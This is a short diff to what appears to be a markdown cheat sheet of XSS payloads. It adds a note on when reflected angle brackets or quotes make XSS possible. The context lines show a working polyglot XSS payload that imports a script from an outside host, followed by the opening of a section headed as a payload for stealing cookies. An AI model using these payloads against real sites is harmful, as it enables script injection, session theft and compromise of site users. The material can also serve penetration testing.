@@ -21,6 +21,10 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 \74k<K/contentEditable/autoFocus/OnFocus​=
 /*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76
 ```
+***Note**
+  1. If < and > symbol reflecting in source code without encoding, XSS possible.
+  2. If ' or " symbol reflecting in source code without encoding, XSS possible.
+
 ## Payload for stealing cookies
 ```js
 <script>
